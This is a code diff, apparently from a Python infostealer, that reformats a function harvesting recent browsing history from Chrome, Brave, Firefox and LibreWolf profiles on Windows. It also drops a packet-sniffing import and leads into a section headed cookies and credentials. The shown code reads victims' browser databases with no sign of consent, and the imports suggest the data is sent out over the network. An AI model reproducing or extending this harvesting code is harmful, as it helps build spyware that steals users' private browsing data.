@@ -10,7 +10,6 @@ import tempfile
 import requests
 import platform
 import threading
-from scapy.all import sniff
 from datetime import datetime, timedelta
 from threading import Thread
 from base64 import b64decode
@@ -98,18 +97,62 @@ def get_browser_history():
     elif system == "Windows":
         local = os.getenv("LOCALAPPDATA", "")
         roam = os.getenv("APPDATA", "")
-        results += extract_history_generic("chrome", os.path.join(local, "Google\\Chrome\\User Data\\Default"),
+
+        # Chrome (Chromium, LOCALAPPDATA)
+        results += extract_history_generic(
+            "chrome",
+            os.path.join(local, "Google\\Chrome\\User Data\\Default"),
             "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
-            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "chrome"}, file="History")
-        results += extract_history_generic("brave", os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
+            lambda r: {
+                "url": r[0],
+                "title": r[1],
+                "visit_time": chrome_ts(r[2]),
+                "browser_type": "chrome"
+            },
+            file="History"
+        )
+
+        # Brave (Chromium, LOCALAPPDATA)
+        results += extract_history_generic(
+            "brave",
+            os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
             "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
-            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "brave"}, file="History")
-        results += extract_history_generic("firefox", os.path.join(roam, "Mozilla", "Firefox", "Profiles"),
+            lambda r: {
+                "url": r[0],
+                "title": r[1],
+                "visit_time": chrome_ts(r[2]),
+                "browser_type": "brave"
+            },
+            file="History"
+        )
+
+        # Firefox (Gecko, APPDATA/Roaming)
+        results += extract_history_generic(
+            "firefox",
+            os.path.join(roam, "Mozilla", "Firefox", "Profiles"),
             "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
-            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "firefox"}, file="places.sqlite")
-        results += extract_history_generic("librewolf", os.path.join(roam, "LibreWolf", "Profiles"),
+            lambda r: {
+                "url": r[0],
+                "title": r[1],
+                "visit_time": firefox_ts(r[2]),
+                "browser_type": "firefox"
+            },
+            file="places.sqlite"
+        )
+
+        # LibreWolf (Gecko fork, APPDATA/Roaming)
+        results += extract_history_generic(
+            "librewolf",
+            os.path.join(roam, "LibreWolf", "Profiles"),
             "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC LIMIT 100",
-            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "librewolf"}, file="places.sqlite")
+            lambda r: {
+                "url": r[0],
+                "title": r[1],
+                "visit_time": firefox_ts(r[2]),
+                "browser_type": "librewolf"
+            },
+            file="places.sqlite"
+        )
     return results
 
 # ========== COOKIES/CREDENTIALS ==========
